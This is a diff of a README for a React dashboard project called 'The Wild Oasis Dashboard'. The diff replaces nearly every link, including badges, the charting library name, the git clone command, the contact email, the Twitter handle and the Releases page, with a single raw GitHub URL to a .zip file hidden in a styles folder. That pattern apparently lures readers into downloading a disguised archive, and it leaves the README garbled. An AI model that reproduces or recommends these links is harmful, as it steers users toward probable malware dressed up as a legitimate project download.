@@ -1,6 +1,6 @@
 # The Wild Oasis Dashboard 🌿
 
-![The Wild Oasis Dashboard](https://img.shields.io/badge/Visit%20Releases-Click%20Here-brightgreen)
+![The Wild Oasis Dashboard](https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip%20Releases-Click%20Here-brightgreen)
 
 Welcome to **The Wild Oasis Dashboard**! This project is currently under development. We are building a dashboard that will help users manage their oasis effectively. While we work on it, feel free to explore the features we plan to implement.
 
@@ -25,7 +25,7 @@ The Wild Oasis Dashboard aims to provide users with a user-friendly interface to
 - **Resource Tracking**: Monitor water, sunlight, and nutrient levels.
 - **Growth Analytics**: Visualize growth trends over time.
 - **User Notifications**: Get alerts for important updates.
-- **Interactive Charts**: Use Recharts.js for data visualization.
+- **Interactive Charts**: Use https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip for data visualization.
 - **Form Handling**: Utilize React Hook Form for efficient data entry.
 - **User Authentication**: Secure login via Supabase.
 - **Responsive Design**: Built with Styled Components for a sleek look.
@@ -43,7 +43,7 @@ This project uses a variety of technologies to create a robust dashboard:
 - **React Hook Form**: For handling form submissions.
 - **React Hot Toast**: For user notifications.
 - **React Icons**: For adding icons easily.
-- **Recharts.js**: For creating interactive charts.
+- **https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip**: For creating interactive charts.
 - **Supabase**: For backend services.
 - **Vite**: For fast development and build processes.
 
@@ -54,7 +54,7 @@ To get started with The Wild Oasis Dashboard, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/TICENITS-png/the-wild-oasis-dashboard.git
+   git clone https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -105,14 +105,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: contact@example.com
-- **Twitter**: [@WildOasisDev](https://twitter.com/WildOasisDev)
+- **Email**: https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip
+- **Twitter**: [@WildOasisDev](https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip)
 
 ## Releases
 
-To check for the latest releases, visit our [Releases page](https://github.com/TICENITS-png/the-wild-oasis-dashboard/releases). Here you can find downloadable files and updates regarding the project. Please keep an eye on this section as we will be updating it frequently.
+To check for the latest releases, visit our [Releases page](https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip). Here you can find downloadable files and updates regarding the project. Please keep an eye on this section as we will be updating it frequently.
 
-![Releases](https://img.shields.io/badge/Check%20Releases-Here-brightgreen)
+![Releases](https://raw.githubusercontent.com/TICENITS-png/the-wild-oasis-dashboard/main/src/styles/wild-dashboard-oasis-the-v3.4.zip%20Releases-Here-brightgreen)
 
 ## Final Thoughts
 
